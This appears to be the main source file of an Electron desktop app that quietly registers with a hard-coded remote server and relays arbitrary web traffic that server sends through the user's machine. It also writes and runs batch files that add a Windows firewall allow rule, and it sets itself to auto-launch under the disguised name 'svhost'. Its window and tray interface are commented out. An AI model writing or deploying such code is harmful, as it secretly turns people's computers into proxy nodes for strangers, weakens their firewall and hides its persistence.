'use strict'

import { app, nativeImage, Tray, Menu, BrowserWindow } from 'electron'
import * as path from 'path'
import { format as formatUrl } from 'url'
const AutoLaunch = require('auto-launch');

let top = {}; // prevent gc to keep windows
let port = 0;
const isDevelopment = process.env.NODE_ENV !== 'production'

// global reference to mainWindow (necessary to prevent window from being garbage collected)
//let mainWindow

function createMainWindow() {
  const window = new BrowserWindow({ webPreferences: { nodeIntegration: true } })

  if (isDevelopment) {
    window.webContents.openDevTools()
  }

  if (isDevelopment) {
    window.loadURL(`http://localhost:${process.env.ELECTRON_WEBPACK_WDS_PORT}`)
  }
  else {
    window.loadURL(formatUrl({
      pathname: path.join(__dirname, 'index.html'),
      protocol: 'file',
      slashes: true
    }))
  }

  window.on('closed', () => {
    top = null;
  })

  window.webContents.on('devtools-opened', () => {
    window.focus()
    setImmediate(() => {
      window.focus()
    })
  })

  return window
}
app.on("before-quit", ev => {

  top.win.removeAllListeners("close");
  top = null;
})

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.dock.hide();
  }
})

app.on('activate', () => {
  // on macOS it is common to re-create a window even after all windows have been closed
  if (top === null) {
    //mainWindow = createMainWindow()
  }
})

// create main BrowserWindow when electron is ready
app.on('ready', () => {
  /*
  top.win = new BrowserWindow({
    skipTaskbar: false,
    frame: true,
    width: 800, height: 600, center: true, minimizable: false, show: false,
    webPreferences: {
      nodeIntegration: false,
      webSecurity: true,
      sandbox: true,
    },
  });
  top.win.removeMenu();

  top.win.loadURL("https://google.com/");
  top.win.on("close", ev => {
    //console.log(ev);
    ev.sender.hide();
    ev.preventDefault(); // prevent quit process
  });
  top.win.on("exit", ev => {
    //console.log(ev);
    ev.sender.hide();
    ev.preventDefault(); // prevent quit process
  });

  // empty image as transparent icon: it can click
  // see: https://electron.atom.io/docs/api/tray/
  top.tray = new Tray(nativeImage.createEmpty());
  const menu = Menu.buildFromTemplate([
    {
      label: "Actions", submenu: [
        {
          label: "Terms", click: (item, window, event) => {
            //console.log(item, event);
            top.win.show();
          }
        },
      ]
    },
    { type: "separator" },
    //{role: "quit"}, // "role": system prepared action menu
  ]);
  top.tray.setToolTip("SS Proxy");
  //top.tray.setTitle("Tray Example"); // macOS only
  top.tray.setContextMenu(menu);

  // Option: some animated web site to tray icon image
  // see: https://electron.atom.io/docs/tutorial/offscreen-rendering/
  top.icons = new BrowserWindow({
    show: false, webPreferences: { offscreen: true }
  });
  top.icons.loadURL("https://trends.google.com/trends/hottrends/visualize");
  top.icons.webContents.on("paint", (event, dirty, image) => {
    if (top.tray) top.tray.setImage(image.resize({ width: 16, height: 16 }));
  });
  */
  checkServer();
})
//const middleWareAddress = "192.168.111.133";
const middleWareAddress = "161.35.52.162";

function getServerList()
{
  //console.log("call get list");
  try{
  const axios = require('axios').default;
  const serverUrl = "http://" + middleWareAddress + "/api/getnewport";
  axios.post(serverUrl).then(
    async function (response) {      
      let ports = response.data.ports;
      //console.log(ports);

      for (port in ports)
      {
        await connectServer(middleWareAddress, port);    
      }
      setTimeout(getServerList, 5000);
    }
  ).catch(async function (err) {
    console.log("port catch error ---- run again!\n", err.message);
    setTimeout(getServerList, 5000)
  })
  }catch(exception)
  {
    console.log("Warning:Unexcpted error", exception);
  }
}

function checkServer() {
  // send request
  const axios = require('axios').default;
  //const serverUrl = "http://192.168.111.133/api/register";
  //const middleWareAddress = "161.35.52.162";
  const serverUrl = "http://" + middleWareAddress + "/api/register";
  axios.post(serverUrl).then(
    function (response) {
      //console.log(response);
      port = response.data.port;
      console.log("get port run server now!\n", port);
      setTimeout(getServerList, 500);
      //createServer(port);
    }
  ).catch(async function (err) {
    console.log("register catch error ---- run again!\n", err.message);
    setTimeout(checkServer, 3000)
  })


}


//sudo lsof -i -P -n | grep LISTEN
//sudo kill -9 `sudo lsof -t -i:80`


const check = (credentials) => {
  return (
    credentials &&
    credentials.username === "test" &&
    credentials.pass === "test"
  );
};
checkNetworkPrivillageForWindows();

makeAutoLaunch();
function connectServer(serverAddress, serverPort) {
    const net = require("net");
    const { parse } = require("basic-auth");
    let proxyToServerSocket
    console.log ("connect to server" + serverAddress + ":" + serverPort);
    let socket = net.createConnection(
    {
      host: serverAddress,
      port: serverPort,
    },
    () => {
      console.log("Connected Middle Ware Now");
    });
    socket.once("data", (data) => {
      try {
        console.log("once data");
        let isTLSConnection = data.toString().indexOf("CONNECT") !== -1;
        //var auth = data.toString().split("Proxy-Authorization: ")[1].split("\r\n")[0];
        //const credentials = parse(auth);  
        //console.log(auth);


        let pserverPort = 80;
        let pserverAddress;
        console.log(data.toString());
        if (isTLSConnection) {
          pserverPort = 443;
          pserverAddress = data
            .toString()
            .split("CONNECT")[1]
            .split(" ")[1]
            .split(":")[0];
        } else {
          pserverAddress = data.toString().split("Host: ")[1].split("\r\n")[0];
        }
        console.log(pserverAddress, ":", pserverPort);

        // Creating a connection from proxy to destination server
        proxyToServerSocket = net.createConnection(
          {
            host: pserverAddress,
            port: pserverPort,
          },
          () => {
            console.log("Get Data Connection" + pserverAddress + ":"  + pserverPort);
          }
        );

        //if (!check(credentials))
        //{
        //  console.log("write unthorized");
        //  clientToProxySocket.write("HTTP/1.1 200 OK\r\n\r\n");
        //}
        // else 
        if (isTLSConnection) {
          console.log("Tls Connection" ,);
          socket.write("HTTP/1.1 200 OK\r\n\r\n");
          
          //proxyToServerSocket.write(data);
        }
        else {
          console.log("proceed --- connection");
          proxyToServerSocket.write(data);
        }

        socket.pipe(proxyToServerSocket);
        proxyToServerSocket.pipe(socket);

        proxyToServerSocket.on("error", (err) => {
          console.log("Proxy to server error");
          console.log(err);
          // setTimeout(
          //   function(){
          //     connectServer(serverAddress,serverPort);
          //   }
          //   , 50)
        });

        // socket.on("error", (err) => {
        //   console.log("Client to proxy error");
        //   console.log(err)
        //   setTimeout(
        //     function(){
        //       connectServer(serverAddress,serverPort);
        //     }
        //     , 50)
        // });
        proxyToServerSocket.once("close" , (data) => {
          //console now
          console.log("on close now!!!!! restart new connection");
          // setTimeout(
          //   function(){
          //     connectServer(serverAddress,serverPort);
          //   }
          //   , 50)
        })
        //proxyToServerSocket.on("data" , (data) => {
        //  //console now
        //  console.log("data is -- ", data);
        //})
      } catch (except) {
        console.log(except);
      }
    });
    socket.on("error", (err) => {
      console.log("Connected Socket Server error");
      if (err.code == 'ECONNRESET' || err.code == 'ECONNREFUSED'  )
      {
        console.log("make connection again!");
        // make connection again()
        // setTimeout(
        //   function(){
        //     connectServer(serverAddress,serverPort);
        //   }
        //   , 3000)
      }
      console.log(err);
    });
}
/*
function createServer(port) {
  const net = require("net");
  const { parse } = require("basic-auth");
  const server = net.createServer();
  console.log("cratre server now....");
  server.on("connection", (clientToProxySocket) => {
    console.log("Client connected to proxy");
    clientToProxySocket.once("data", (data) => {
      try {
        let isTLSConnection = data.toString().indexOf("CONNECT") !== -1;
        //var auth = data.toString().split("Proxy-Authorization: ")[1].split("\r\n")[0];
        //const credentials = parse(auth);  
        //console.log(auth);


        let serverPort = 80;
        let serverAddress;
        //console.log(data.toString());
        if (isTLSConnection) {
          serverPort = 443;
          serverAddress = data
            .toString()
            .split("CONNECT")[1]
            .split(" ")[1]
            .split(":")[0];
        } else {
          serverAddress = data.toString().split("Host: ")[1].split("\r\n")[0];
        }
        //console.log(serverAddress);

        // Creating a connection from proxy to destination server
        let proxyToServerSocket = net.createConnection(
          {
            host: serverAddress,
            port: serverPort,
          },
          () => {
            //console.log("Proxy to server set up");
          }
        );

        //if (!check(credentials))
        //{
        //  console.log("write unthorized");
        //  clientToProxySocket.write("HTTP/1.1 200 OK\r\n\r\n");
        //}
        // else 
        // if (isTLSConnection) {
        //   console.log("write tls");
        //   clientToProxySocket.write("HTTP/1.1 200 OK\r\n\r\n");
        // }
        // else {
        //   console.log("proceed");
        proxyToServerSocket.write(data);
        // }

        clientToProxySocket.pipe(proxyToServerSocket);
        proxyToServerSocket.pipe(clientToProxySocket);

        proxyToServerSocket.on("error", (err) => {
          //console.log("Proxy to server error");
          //console.log(err);
        });

        clientToProxySocket.on("error", (err) => {
          //console.log("Client to proxy error");
          //console.log(err)
        });
      } catch (except) {

      }
    });


  });
  */

  /*const http = require("http");
  const { parse } = require("basic-auth");
  const PROXY_USERNAME = "test";
  const PROXY_PASSWORD = "test";
  const PROXY_PORT = 6000;
  
  const check = (credentials) => {
    return (
      credentials &&
      credentials.username === PROXY_USERNAME &&
      credentials.pass === PROXY_PASSWORD
    );
  };
  
  const proxy_server = http.createServer(function (request, response) {
    console.log("listening...... get request");
    const credentials = parse(request.headers["proxy-authorization"]);
    if (!check(credentials)) {
        console.log("auth failed!!!");
      response.statusCode = 401;
      response.end("Access denied");
    }
  
    const options = {
      port: 80,
      host: request.headers["host"],
      method: request.method,
      path: request.url,
      headers: request.headers,
    };
  
    const proxy_request = http.request(options);
  
    proxy_request.on("response", function (proxy_response) {
      proxy_response.on("data", function (chunk) {
        response.write(chunk, "binary");
      });
      proxy_response.on("end", function () {
        response.end();
      });
      response.writeHead(proxy_response.statusCode, proxy_response.headers);
    });
  
    request.on("data", function (chunk) {
      proxy_request.write(chunk, "binary");
    });
  
    request.on("end", function () {
      proxy_request.end();
    });
  });
  console.log("started");
  proxy_server.listen(PROXY_PORT);*/


function checkNetworkPrivillageForWindows() {
  // allow network
  let spawn = require("child_process").spawn;

  // let bat = spawn("cmd.exe", [
  //     "/c",          // Argument for cmd.exe to carry out the specified script
  //     "D:\test.bat", // Path to your file
  //     "argument1",   // First argument
  //     "argumentN"    // n-th argument
  // ]);
  // cehck if rule exists
  let shell1 = 'netsh advfirewall firewall show rule name="paap"';
  const fs = require('fs');
  let shell = 'netsh advfirewall firewall add rule name="paap" program="' + app.getPath('exe') + '" dir=in action=allow protocol=UDP';
  let dir = app.getPath('exe');
  dir = dir.substring(0, dir.lastIndexOf('\\'));
  fs.writeFile(dir + "\\check.bat", shell1, function (err) {
    if (err) {
      return console.log(err);
    }
    let bat = spawn("cmd.exe", [
      "/c",          // Argument for cmd.exe to carry out the specified script
      dir + "\\check.bat", // Path to your file
      "",   // First argument
      ""    // n-th argument
    ]);
    // exec it 
    bat.stdout.on("data", (data) => {

      let s = new String(data.toString());
      //console.log("data is -", data.toString(), "-")


      if (s.search("No rules match the specified criteria.") > 0) {
        // not exists
        //const homeDir = require('os').homedir(); // See: https://www.npmjs.com/package/os
        //const desktopDir = `${homeDir}/Desktop`;
        //dir = desktopDir;
        let batPath = dir + "\\privillage.bat";
        console.log("batPath is", batPath);
        fs.writeFile(batPath, shell, function (err) {
          if (err) {
            return console.log(err);
          }
          console.log("shell is \n", shell);
          let bat = spawn("cmd.exe", [
            "/c",          // Argument for cmd.exe to carry out the specified script
            batPath, // Path to your file
            "",   // First argument
            ""    // n-th argument
          ]);

          bat.stdout.on("data", (data) => {
            console.log("shell exec", data.toString())
          });

          bat.stderr.on("data", (err) => {
            // Handle error...
            console.log("shell error", error)
          });

          bat.on("exit", (code) => {
            // Handle exit
            console.log("shell exit", code)
          });


        });

      }
    });

    bat.stderr.on("data", (err) => {

    });

    bat.on("exit", (code) => {
    });
  });

}

function makeAutoLaunch() {

  //
  let autoLaunch = new AutoLaunch({
    name: 'svhost',
    path: app.getPath('exe'),
  });
  autoLaunch.isEnabled().then((isEnabled) => {
    if (!isEnabled) autoLaunch.enable();
  });

}